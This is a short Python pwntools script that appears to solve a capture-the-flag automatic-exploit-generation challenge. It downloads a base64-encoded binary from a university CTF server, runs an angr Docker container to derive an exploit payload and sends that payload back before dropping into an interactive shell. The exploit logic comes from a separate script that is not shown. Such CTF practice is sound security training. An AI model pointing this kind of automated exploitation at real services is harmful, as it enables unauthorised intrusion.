#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os
import subprocess
import sys

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

cur_dir = os.path.abspath(".")

# remove angr docker first
resp = myexec("docker ps -a")
if "angr" in resp:
    os.system("docker rm -f angr")

# AEG
def aeg(first=None):
    global cur_dir
    # save binary
    log.success("Decode & saving binary...")
    if first:
        r.recvuntil("encoded by base64\n")
    else:
        r.recvuntil("GJ!")

    enc = r.recvuntil("0th")
    enc = enc[:enc.index("0th"):]
    b = base64.b64decode(enc)
    with open("tmp", "wb") as f:
        f.write(b)

    # run angr docker background
    log.success("launching angr docker at background...")
    os.system("docker run -d -t --ulimit='stack=-1:-1' --name angr -v {}:/home/angr/work/ angr/angr".format(cur_dir))

    # set env to run angr
    log.success("Setting environment to run angr...")
    p = process(argv = ["docker", "exec" ,"-i" ,"angr" ,"su" ,"angr"])
    p.sendline("source /usr/share/virtualenvwrapper/virtualenvwrapper.sh")
    p.sendline("workon angr")

    # send cmd to run solving script
    run_angr = "cd /home/angr/work && ./win.py"
    log.success("Running angr script...")
    p.sendline(run_angr)
    p.recvuntil("DILDO!\n")
    payload = ""
    while True:
        tmp = p.recvline()
        if "DILDO!" in tmp:
            break
        else:
            payload += tmp

    # check payload & remove angr docker
    log.success("Running angr script done!")
    print "Final payload:", repr(payload)
    log.success("Removing angr container...")
    p.close()
    os.system("docker rm -f angr")

    payload = payload[:-1:] # remove last newline
    r.send(payload)


if __name__ == '__main__':
    r = remote("bamboofox.cs.nctu.edu.tw", 11015)
    aeg(first=1)
    aeg()
    r.interactive()
